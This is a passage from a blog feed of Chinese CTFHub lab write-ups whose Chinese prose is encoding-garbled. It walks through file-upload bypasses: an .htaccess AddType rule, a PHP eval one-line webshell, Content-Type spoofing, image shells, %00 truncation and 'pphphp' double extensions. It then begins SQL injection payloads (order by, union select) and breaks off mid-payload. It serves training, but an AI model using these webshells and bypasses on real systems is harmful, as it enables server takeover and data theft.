src="https://img-blog.csdnimg.cn/20201119125620833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>èšå‰‘è¿æ¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20201119125123749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥æ‰¾flag<br><img src="https://img-blog.csdnimg.cn/20201119125141517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>ç¬¬äºŒç§æ–¹æ³•ï¼š</strong>Â·</p><p>å†…å®¹ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .jpg<br></code></pre></td></tr></table></figure><p>å°±æˆåŠŸåœ°ä½¿è¯¥<code>.htaccess</code>æ–‡ä»¶æ‰€åœ¨ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„åç¼€ä¸º<code>.jpg</code>çš„æ–‡ä»¶è¢«Apacheå½“åšphpæ–‡ä»¶</p><p>ä¸Šä¼ test.htaccess</p><p><img src="https://img-blog.csdnimg.cn/2020111920274848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20201119202825440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†ä¸Šä¼ <code>3.jpg</code>ï¼Œå†…å®¹ä¸º<code>&lt;?php  @eval($_POST[&quot;pass&quot;]);?&gt;</code> ï¼Œè·å–åˆ°ä¸Šä¼ æ–‡ä»¶è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/20201119202922137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>èšå‰‘è¿æ¥ï¼Œè¿æ¥æˆåŠŸã€‚<br><img src="https://img-blog.csdnimg.cn/20201119203023188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>å‚è€ƒæ–‡ç« </strong>:<a href="https://blog.csdn.net/wn314/article/details/77074477">æ–‡ä»¶è§£ææ¼æ´</a></p><h2 id="0x04-MIMEç»•è¿‡"><a href="#0x04-MIMEç»•è¿‡" class="headerlink" title="0x04 MIMEç»•è¿‡"></a>0x04 MIMEç»•è¿‡</h2><p><img src="https://img-blog.csdnimg.cn/20201120222519718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç›´æ¥ä¸Šä¼ 4.phpï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®<br><img src="https://img-blog.csdnimg.cn/20201120223830616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¥ä½¿ç”¨MIMEç»•è¿‡ï¼Œç™¾åº¦äº†è§£ä¸€ä¸‹<strong>MIME</strong></p><blockquote><p>  MIME(Multipurpose Internet MailExtensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚MIME æ¶ˆæ¯èƒ½åŒ…å«æ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ä»¥åŠå…¶ä»–åº”ç”¨ç¨‹åºä¸“ç”¨çš„æ•°æ®ã€‚</p></blockquote><p><code>MIME</code>å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³ audioã€å›¾è±¡ Imageç­‰,åé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚</p><p>å¸¸è§çš„MMEç±»å‹ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#textè¡¨æ˜æ–‡ä»¶æ˜¯æ™®é€šæ–‡æœ¬</span><br>text/plain<br>text/html<br><span class="hljs-comment">#imageè¡¨æ˜æ˜¯æŸç§å›¾åƒæˆ–è€…åŠ¨æ€å›¾(gif)</span><br>image/jpeg<br>image/png<br><span class="hljs-comment">#audioè¡¨æ˜æ˜¯æŸç§éŸ³é¢‘æ–‡ä»¶</span><br>audio/mpeg<br>audio/ogg<br>audio<span class="hljs-comment">/*</span><br><span class="hljs-comment">#videoè¡¨æ˜æ˜¯æŸç§è§†é¢‘æ–‡ä»¶</span><br><span class="hljs-comment">video/mp4</span><br><span class="hljs-comment">#applicationè¡¨æ˜æ˜¯æŸç§äºŒè¿›åˆ¶æ•°æ®</span><br><span class="hljs-comment">application/*</span><br><span class="hljs-comment">application/json</span><br><span class="hljs-comment">application/javascript</span><br><span class="hljs-comment">application/ecmascript</span><br><span class="hljs-comment">application/octet-stream</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ <code>4.php</code>ï¼Œä½¿ç”¨bpæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typedçš„å€¼ï¼Œæ”¹æˆ<code>Content-Type: image/jpeg</code>ï¼Œç„¶åæ”¾åŒ…<br><img src="https://img-blog.csdnimg.cn/20201120222615911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ æˆåŠŸï¼Œå¾—åˆ°æ–‡ä»¶ç›¸å¯¹è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/20201120222706592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>èšå‰‘è¿æ¥ï¼ŒæŸ¥æ‰¾ç›®å½•æ–‡ä»¶ï¼Œå³å¯å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201120222949700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å‚è€ƒæ–‡ç« : <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME ç±»å‹</a></p><h2 id="0x05-æ–‡ä»¶å¤´æ£€æŸ¥"><a href="#0x05-æ–‡ä»¶å¤´æ£€æŸ¥" class="headerlink" title="0x05 æ–‡ä»¶å¤´æ£€æŸ¥"></a>0x05 æ–‡ä»¶å¤´æ£€æŸ¥</h2><p><img src="https://img-blog.csdnimg.cn/20201122155831873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬5.phpï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®</p><p><img src="https://img-blog.csdnimg.cn/20201122155907113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> å†æŠŠ5.phpä¿®æ”¹æˆ5.jpgä¸Šä¼ ï¼Œå‘ç°æç¤ºæ–‡ä»¶é”™è¯¯<br><img src="https://img-blog.csdnimg.cn/20201122160052550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°è¯•<strong>MMEç»•è¿‡</strong>ï¼Œä¸Šä¼ <code>5.php</code>ï¼ŒæŠ“åŒ…ï¼Œä¿®æ”¹Content-Typedçš„å€¼ï¼Œç„¶åæ”¾åŒ…ï¼Œå‘ç°æç¤ºæ–‡ä»¶é”™è¯¯<br><img src="https://img-blog.csdnimg.cn/20201122160839518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åº”è¯¥æ˜¯å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œäº†æ£€æµ‹ï¼Œæ¥åˆ¶ä½œä¸€ä¸ªå›¾ç‰‡ç <code>m.php</code><br><img src="https://img-blog.csdnimg.cn/20201122162645668.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠ“åŒ…ä¿®æ”¹Content-Typeçš„å€¼ï¼Œæ”¾åŒ…<br><img src="https://img-blog.csdnimg.cn/2020112216332349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»“æœæç¤ºæ–‡ä»¶é”™è¯¯<br><img src="https://img-blog.csdnimg.cn/20201122193529247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹äº†å¤§å¸ˆå‚…çš„wpï¼Œè¯´å°½é‡æ¢å°ä¸€ç‚¹çš„å›¾ç‰‡ï¼Œå°±ä¼šæˆåŠŸï¼Œè¿™æ¬¡æ¢äº†ä¸€ä¸ªéå¸¸å°çš„å›¾ç‰‡ï¼Œé‡æ–°åˆ¶ä½œå›¾ç‰‡é©¬<br><img src="https://img-blog.csdnimg.cn/2020112219263730.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ flag.phpï¼ŒæŠ“åŒ…ä¿®æ”¹Content-Typeçš„å€¼ä¸º<code>image/png</code><br><img src="https://img-blog.csdnimg.cn/20201122192734886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ æˆåŠŸï¼Œå¾—åˆ°ä¸Šä¼ è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/2020112219282666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201122192926706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="0x06-00æˆªæ–­"><a href="#0x06-00æˆªæ–­" class="headerlink" title="0x06 00æˆªæ–­"></a>0x06 00æˆªæ–­</h2><p>äº†è§£ä¸€ä¸‹00æˆªæ–­ï¼Œ<a href="http://www.admintony.com/%E5%85%B3%E4%BA%8E%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%8400%E6%88%AA%E6%96%AD%E5%88%86%E6%9E%90.html">å…³äºä¸Šä¼ ä¸­çš„00æˆªæ–­åˆ†æ</a><br><img src="https://img-blog.csdnimg.cn/20201122170816232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæç¤ºæ–‡ä»¶ç±»å‹ä¸åŒ¹é…, ä½†åœ¨urlæ å‡ºç°äº†è·¯å¾„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/20201122165152579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹æºä»£ç <br><img src="https://img-blog.csdnimg.cn/20201122165304568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ shell.jpgï¼ŒæŠ“åŒ…<br><img src="https://img-blog.csdnimg.cn/20201122165938867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ„é€ 00æˆªæ–­ï¼Œæ·»åŠ <code>shell.php%00</code>ï¼Œæ”¾åŒ…<br><img src="https://img-blog.csdnimg.cn/2020112217004529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ æˆåŠŸè·¯å¾„ä¸º<code>upload/shell.php</code>ï¼Œèšå‰‘è¿æ¥<br><img src="https://img-blog.csdnimg.cn/2020112217043423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‹¿åˆ°flag<br><img src="https://img-blog.csdnimg.cn/2020112217050469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="0x07-åŒå†™åç¼€"><a href="#0x07-åŒå†™åç¼€" class="headerlink" title="0x07 åŒå†™åç¼€"></a>0x07 åŒå†™åç¼€</h2><p><img src="https://img-blog.csdnimg.cn/20201122171341824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬shell.phpï¼Œè™½ç„¶ä¸Šä¼ æˆåŠŸï¼Œä½†åç¼€å´æ¶ˆå¤±äº†<br><img src="https://img-blog.csdnimg.cn/20201122171256124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹æºç ï¼Œ<code>$name = str_ireplace($blacklist, &quot;&quot;, $name);</code>ï¼Œå˜é‡<code>blacklist</code>é‡Œé¢çš„å€¼ä¼šè¢«æ›¿æ¢ï¼Œåç¼€è¢«è¿‡æ»¤äº†<br><img src="https://img-blog.csdnimg.cn/20201122171458940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­ä¸Šä¼ <code>shell.php</code>ï¼Œç„¶åæŠ“åŒ…ä¿®æ”¹æˆ<code>shell.pphphp</code>ï¼Œä¸­é—´çš„phpå­—ç¬¦ä¸²è¢«è¿‡æ»¤ï¼Œå‰©ä¸‹çš„<code>p</code>å’Œ<code>hp</code>å°±ç»„åˆæˆäº†<code>php</code>ã€‚</p><p><img src="https://img-blog.csdnimg.cn/2020112217203470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œå¾—åˆ°æ–‡ä»¶ä¸Šä¼ è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/2020112217205079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>èšå‰‘è¿æ¥,flagå°±åœ¨è¿™<br><img src="https://img-blog.csdnimg.cn/20201122172156217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€äº›å¹³æ—¶ä¸æ€ä¹ˆç”¨çš„å®¹æ˜“è¢«äººå¿½è§†çš„æ–‡ä»¶æ‰©å±•åï¼Œæ¥ç»•è¿‡è¿™ç§ç±»å‹çš„éªŒè¯ã€‚</p><p><strong>é»‘åå•ç»•è¿‡</strong><br>é€šè¿‡ä¸Šä¼ ä¸å—æ¬¢è¿çš„phpæ‰©å±•æ¥ç»•è¿‡é»‘åå•ã€‚ä¾‹å¦‚ï¼šphtï¼Œphptï¼Œphtmlï¼Œphp3ï¼Œphp4ï¼Œphp5ï¼Œphp6</p><p><strong>ç™½åå•ç»•è¿‡</strong><br>é€šè¿‡æŸç§ç±»å‹çš„æŠ€å·§æ¥ç»•è¿‡ç™½åå•ï¼Œä¾‹å¦‚æ·»åŠ ç©ºå­—èŠ‚æ³¨å…¥ï¼ˆshell.phpï¼…00.gifï¼‰ï¼Œæˆ–ä½¿ç”¨åŒé‡æ‰©å±•æ¥ä¸Šä¼ æ–‡ä»¶ï¼ˆshell.jpg.phpï¼‰ã€‚</p><p><strong>æ‰©å±•åå¤§å°å†™æ¥ç»•è¿‡</strong><br>ä¾‹å¦‚ï¼špHpï¼ŒPhpï¼ŒphPã€‚</p><p><strong>åŒå†™åç¼€ç»•è¿‡</strong><br>ä¾‹å¦‚ï¼špphphp</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-sqlæ³¨å…¥ç»ƒä¹ </title>
    <link href="/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/11/15/CTFHub-Web-sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šCTFHubé¶åœºé€šå…³ï¼ˆäºŒï¼‰</p> <a id="more"></a><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>sqlæ³¨å…¥ç”¨åˆ°çš„ä¸€äº›ç›¸å…³å‡½æ•°<br>| å‡½æ•°                        | æè¿°                                                         |<br>| â€”â€”â€”â€”â€”â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” |<br>| table_schema                | æ•°æ®åº“å                                                     |<br>| table_name                  | è¡¨å                                                         |<br>| column_name                 | åˆ—å                                                         |<br>| information_schema.schemata | åŒ…å«æ‰€æœ‰æ•°æ®åº“çš„å                                           |<br>| information_schema.tables   | åŒ…å«æ‰€æœ‰åº“çš„è¡¨å                                             |<br>| information_schema.columns  | åŒ…å«æ‰€æœ‰è¡¨çš„å­—æ®µ                                             |<br>| group_concat()å‡½æ•°åŠŸèƒ½      | å°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ |</p><h2 id="æ•´æ•°å‹æ³¨å…¥"><a href="#æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="æ•´æ•°å‹æ³¨å…¥"></a>æ•´æ•°å‹æ³¨å…¥</h2><p>è¾“å…¥1<br><img src="https://img-blog.csdnimg.cn/20201114180314872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.åˆ¤æ–­æ³¨å…¥ç±»å‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;        æŠ¥é”™</span><br><span class="hljs-string">1 and 1=1 è¿”å›æ­£ç¡®</span><br><span class="hljs-string">1 and 1=2 è¿”å›é”™è¯¯</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ»¡è¶³ä»¥ä¸Šä¸‰æ¡ï¼Œåˆ™å¯ä»¥åˆ¤æ–­è¯¥URLå­˜åœ¨æ•°å­—å‹æ³¨å…¥ã€‚</p><p>2.åˆ¤æ–­å­—æ®µæ•°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>    å›æ˜¾æ­£å¸¸<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>    å›æ˜¾æ­£å¸¸<br><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>    è¿”å›é”™è¯¯<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å­—æ®µæ•°ä¸º2</p><p>3 .è”åˆæŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>    å›æ˜¾æ­£å¸¸<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>           å›æ˜¾æ­£å¸¸<br><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>         è¿”å›é”™è¯¯<br></code></pre></td></tr></table></figure><p>å›æ˜¾ç‚¹ä½æ˜¯1å’Œ2</p><p>4.çˆ†æ•°æ®åº“å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?id=<span class="hljs-number">-1</span> union select <span 